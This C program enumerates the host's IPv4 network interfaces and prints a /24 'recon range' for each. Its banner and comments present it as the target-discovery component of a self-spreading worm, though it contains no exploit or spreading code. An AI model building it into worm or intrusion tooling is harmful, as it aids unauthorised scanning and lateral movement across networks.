#include <stdio.h>
#include <string.h>
#include <ifaddrs.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main() {
    struct ifaddrs *ifaddr, *ifa;
    char addr_str[INET_ADDRSTRLEN];

    if (getifaddrs(&ifaddr) == -1) {
        perror("getifaddrs");
        return 1;
    }

    printf("\n--- CHIMERA INTERFACE RESOLVER ---\n");
    for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
        // We only care about IPv4 addresses
        if (ifa->ifa_addr == NULL || ifa->ifa_addr->sa_family != AF_INET) continue;

        inet_ntop(AF_INET, &((struct sockaddr_in *)ifa->ifa_addr)->sin_addr, addr_str, INET_ADDRSTRLEN);
        
        // Skip loopback (127.0.0.1) because the worm can't spread to its own shadow
        if (strcmp(ifa->ifa_name, "lo") == 0) continue;

        printf("[+] Interface: %s\n", ifa->ifa_name);
        printf("[+] IP Address: %s\n", addr_str);
        
        // Logic to strip the last octet to find the subnet prefix
        char *last_dot = strrchr(addr_str, '.');
        if (last_dot) {
            *last_dot = '\0';
            printf("[*] Suggested Recon Range: %s.0/24\n", addr_str);
        }
    }

    freeifaddrs(ifaddr);
    printf("--- RESOLVER COMPLETE ---\n");
    return 0;
}
